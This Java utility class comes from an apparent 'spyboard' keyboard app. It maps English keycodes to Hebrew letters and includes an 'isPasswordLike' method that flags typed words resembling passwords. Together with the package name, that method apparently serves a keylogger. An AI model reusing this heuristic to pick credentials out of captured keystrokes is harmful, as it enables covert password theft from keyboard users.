package com.idankorenisraeli.spyboard.utils;

/**
 * By using this class we will convert english characters to hebrew
 */
public class KeycodeDictionary {
    private static KeycodeDictionary single_instance = null;

    public static KeycodeDictionary getInstance(){
        if(single_instance == null)
            single_instance = new KeycodeDictionary();

        return single_instance;
    }

    /**
     * checks if a given string looks like a password
     * @param str a certain word
     * @return true if it contains upper case, lower case and digits.
     */
    public boolean isPasswordLike(String str){
        if(str.toUpperCase().equals(str.toLowerCase()))
            return false; //no upper and lower case in the same word
        if(!str.matches(".*\\d.*"))
            return false; //string includes upper, lower, digits
        return true;
    }

    public boolean isSymbol(char c){
        
        //if (last == '.' || last == ':' || last == ',' || last == '!' || last == '?' || last == ')' || last == '(')
        
        return c == '.' || c == ':' || c == ',' || c == '!' || c == '?' || c == ')' || c == '('
                || c == '|' || c == '"' || c == '~' || c == '-' || c=='\\' || c=='/';
        
    }
    
    /**
     * Converting english to hebrew
     * @param primaryCode keycode of an english keyboard
     * @return the matching hebrew character on the keyboard
     */
    public char engToHeb(int primaryCode){
        switch (primaryCode){
            case 'q':
                return '/';
            case 'w':
                return '\'';
            case 'e':
                return 'ק';
            case 'r':
                return 'ר';
            case 't':
                return 'א';
            case 'y':
                return 'ט';
            case 'u':
                return 'ו';
            case 'i':
                return 'ן';
            case 'o':
                return 'ם';
            case 'p':
                return 'פ';
            case 'a':
                return 'ש';
            case 's':
                return 'ד';
            case 'd':
                return 'ג';
            case 'f':
                return 'כ';
            case 'g':
                return 'ע';
            case 'h':
                return 'י';
            case 'j':
                return 'ח';
            case 'k':
                return 'ל';
            case 'l':
                return 'ך';
            case 878:
                return 'ף';
            case 'z':
                return 'ז';
            case 'x':
                return 'ס';
            case 'c':
                return 'ב';
            case 'v':
                return 'ה';
            case 'b':
                return 'נ';
            case 'n':
                return 'מ';
            case 'm':
                return 'צ';
            case 879:
                return 'ת';
            case 880:
                return 'ץ';
            case 881:
                return '-';


        }
        return (char)primaryCode; // couldn't find any heb key
    }



}
